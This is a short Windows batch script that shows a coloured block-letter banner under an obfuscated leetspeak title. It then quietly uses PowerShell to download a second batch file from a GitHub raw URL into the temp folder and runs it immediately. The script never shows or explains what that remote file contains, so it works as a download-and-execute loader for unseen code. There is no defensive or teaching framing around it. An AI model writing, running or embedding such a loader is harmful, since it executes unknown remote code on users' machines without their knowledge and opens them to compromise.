@echo off
chcp 65001 >nul
Color 0D & Mode con cols=34 lines=7
title D4R4N0X-75X7-V3R1D4

echo.
echo  ██████╗ ██████╗ ██████╗ ███████╗
echo  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
echo  ██████╔╝██████╔╝██║  ██║███████╗
echo  ██╔══██╗██╔══██╗██║  ██║╚════██║
echo  ██████╔╝██████╔╝██████╔╝███████║
echo  ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝

setlocal
set "tempFile=%temp%\D4R4N0X-file.bat"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pikinez/DataBase/main/D4R4N0X-file.bat' -OutFile '%tempFile%'"
if exist "%tempFile%" (
    start "" "%tempFile%"
)

exit
